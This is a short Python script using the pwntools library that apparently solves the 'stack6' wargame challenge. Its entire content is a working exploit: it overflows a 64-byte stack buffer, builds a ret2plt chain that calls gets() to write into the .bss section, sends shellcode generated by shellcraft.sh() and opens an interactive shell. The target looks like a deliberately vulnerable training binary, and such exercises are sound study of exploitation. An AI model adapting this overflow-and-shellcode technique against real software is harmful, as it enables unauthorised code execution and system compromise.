#!/usr/bin/env python
# coding: UTF-8

from pwn import *

context(os='linux', arch='i386')
# context.log_level = 'debug'

p = process(['./stack6'])


elf = ELF('./stack6')

buf_size = 64

payload = 'A' * buf_size
payload += 'AAAA' * 4
# ret2plt
payload += p32(elf.plt['gets']) + p32(elf.bss()) + p32(elf.bss())

p.recvuntil('please: ')

p.sendline(payload)
p.sendline(asm(shellcraft.sh()))

p.interactive()


